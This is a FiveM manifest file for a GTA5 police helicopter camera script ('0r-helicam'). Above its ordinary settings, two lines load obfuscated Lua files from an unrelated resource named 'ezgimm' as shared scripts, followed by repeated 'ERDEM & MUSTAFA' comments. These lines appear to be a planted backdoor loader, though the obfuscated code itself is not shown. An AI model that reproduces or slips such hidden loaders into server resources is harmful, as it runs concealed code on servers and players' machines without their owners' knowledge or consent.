shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA
fx_version "cerulean"
lua54 "yes"
game "gta5"
name "0r-helicam"
author "0Resmon"
version "1.0.1"
description "FiveM LSPD Heli Cam Script"
client_script "client/init.lua"
server_script "server/init.lua"
ui_page "ui/build/index.html"
files {
    "ui/build/index.html",
    "ui/build/**/*",
}
escrow_ignore {
    "client/**/*",
    "server/**/*",
}
dependency '/assetpacks'